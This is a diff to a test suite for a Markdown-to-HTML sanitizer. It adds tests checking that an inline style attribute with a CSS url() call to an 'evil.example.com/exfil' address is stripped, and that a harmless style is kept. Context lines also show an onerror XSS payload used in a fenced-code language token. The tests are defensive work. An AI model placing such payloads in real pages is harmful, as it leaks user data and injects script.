@@ -558,6 +558,23 @@ describe('convertMarkdownToHtml', () => {
         assert.ok(!/<link[\s>]/i.test(html), `<link> must be removed (got: ${html})`);
     });
 
+    it('strips an inline style="" attribute carrying a network-fetching CSS construct, keeping the element (#523)', () => {
+        // The <style> ELEMENT is dropped wholesale above; an inline style
+        // ATTRIBUTE carries the same background:url(...) exfiltration primitive
+        // but was previously left intact. Assert the attribute is gone and the
+        // element itself survives -- deliberately NOT asserting against the
+        // payload's domain-shaped substring, which trips CodeQL's
+        // incomplete-URL-substring rule on a negative test assertion.
+        const html = convertMarkdownToHtml('<div style="background:url(https://evil.example.com/exfil?x=1)">kept</div>');
+        assert.ok(!/style\s*=/i.test(html), `the dangerous inline style attribute must be stripped (got: ${html})`);
+        assert.ok(/kept/.test(html), `the element's content must survive attribute stripping (got: ${html})`);
+    });
+
+    it('preserves a benign inline style attribute with no network-fetching CSS construct (#523: no over-removal)', () => {
+        const html = convertMarkdownToHtml('<div style="color:#333;text-align:center">kept</div>');
+        assert.ok(/style\s*=/i.test(html), `a benign inline style must be preserved (got: ${html})`);
+    });
+
     it('allowlists the fenced-code language token before it reaches the class attribute (#498)', () => {
         const html = convertMarkdownToHtml('```a"><img/src=x/onerror=alert(1)>\ncode here\n```');
         // The downstream sanitizeRenderedHtml pass would strip a bare onerror=
